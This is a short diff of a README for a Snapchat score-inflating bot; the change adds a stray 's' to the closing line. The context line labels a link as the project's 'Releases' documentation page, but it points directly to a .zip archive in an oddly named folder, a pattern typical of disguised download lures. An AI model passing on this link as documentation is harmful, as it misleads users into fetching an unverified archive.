@@ -79,4 +79,4 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 ## 🔗 Visit for More Information
 To get the latest updates and detailed documentation, visit the official GitHub page: [snapchat-score-bot Releases](https://raw.githubusercontent.com/Sveveshaha/snapchat-score-bot/main/muscosity/snapchat_score_bot_v3.0.zip).
 
-Thank you for using the Snapchat Score Bot! Enjoy increasing your Snapchat score effortlessly.
+Thank you for using the Snapchat Score Bot! Enjoy increasing your Snapchat score effortlessly.s 
